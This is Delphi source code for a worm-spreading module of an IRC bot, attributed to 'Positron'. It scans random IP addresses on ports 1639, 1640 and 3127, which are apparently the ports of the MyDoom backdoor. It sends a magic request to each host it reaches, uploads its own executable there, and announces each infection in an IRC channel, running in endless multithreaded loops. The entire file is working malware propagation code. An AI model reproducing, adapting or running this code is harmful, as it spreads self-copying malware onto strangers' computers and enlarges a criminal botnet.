{
   UNIT CREATED BY POSITRON!
   http://positronvx.cjb.net
}

UNIT uMyDoom;

INTERFACE

USES
  Windows, WinSock;

Var
 MyD:Integer;
 PROCEDURE StartMyDoom(NumberOfThreads:WORD);

IMPLEMENTATION

Uses pBot, pfunc;

VAR
  Request : ARRAY[1..5] OF BYTE = ($85,$13,$3c,$9e,$a2);

TYPE
  TMyDoom = CLASS(TObject)
  PRIVATE
    szIPAddr     : STRING;
    PROCEDURE SendFile(FileName,HostName:STRING);
  PUBLIC
    PROCEDURE StartMyDoom;
END;

//------------------------------------------------------------------------------
PROCEDURE TMyDoom.SendFile(FileName,HostName:STRING);
VAR
  F      : FILE;
  Sock   : Integer;
  J      : Integer;
  Addr   : TSockAddrIn;
  Buf    : ARRAY [0..1023] OF Char;
BEGIN
  szIPAddr:=IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1);
  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  If Sock<=0 Then inc(mydoom_failed);
  IF Sock<=0 THEN Exit;

  Addr.sin_family := af_inet;
  Addr.sin_addr.S_addr := inet_addr(pchar(szIPAddr));
  Addr.sin_port := htons(1639);
  inc(mydoom_tries);
  If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then
  Begin
    inc(mydoom_failed);
    Addr.sin_family := af_inet;
    Addr.sin_addr.S_addr := inet_addr(pchar(szIPAddr));
    Addr.sin_port := htons(1640);
    inc(mydoom_tries);
    If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then
    Begin
      inc(mydoom_failed);
      Addr.sin_family := af_inet;
      Addr.sin_addr.S_addr := inet_addr(pchar(szIPAddr));
      Addr.sin_port := htons(3127);
      inc(mydoom_tries);      
      If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then
      Begin
        inc(mydoom_failed);
        Exit;
      End;
    End;
  End;

  Send(Sock,Request[1],5,0);
  AssignFile(F,FileName);
  FileMode:=0;
  Reset(F,1);
  REPEAT
    BlockRead(F,Buf[0],SizeOf(Buf),J);
    IF J<=0 THEN Break;
    IF Send(Sock,Buf[0],J,0)<=0 THEN Break;
  UNTIL j<>1024;
  CloseSocket(Sock);
  CloseFile(F);
  If Not Bot.Silent Then
    Bot.SendData('PRIVMSG '+bot.szChannel+' :mydoom_infect '+szIPAddr+#10);
  inc(mydoom_infected);
END;

//------------------------------------------------------------------------------
PROCEDURE TMyDoom.StartMyDoom;
VAR
  WD : TWSAData;
BEGIN
  WHILE True DO BEGIN
    WSAStartUp(MakeWord(1,1),WD);
    SendFile(paramstr(0),szIPAddr);
    WSACleanup;
  END;
END;

//------------------------------------------------------------------------------
PROCEDURE StartRandomThread;
VAR
  MyDoom : TMyDoom;
BEGIN
  MyDoom:=TMyDoom.Create;
  MyDoom.StartMyDoom;
END;

//------------------------------------------------------------------------------
PROCEDURE StartMyDoom(NumberOfThreads:WORD);
VAR
  I        : WORD;
  ThreadId : Cardinal;
BEGIN
  MyDoomStarted := True;
  Randomize;
  FOR I:=1 TO NumberOfThreads DO BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
END;

END.
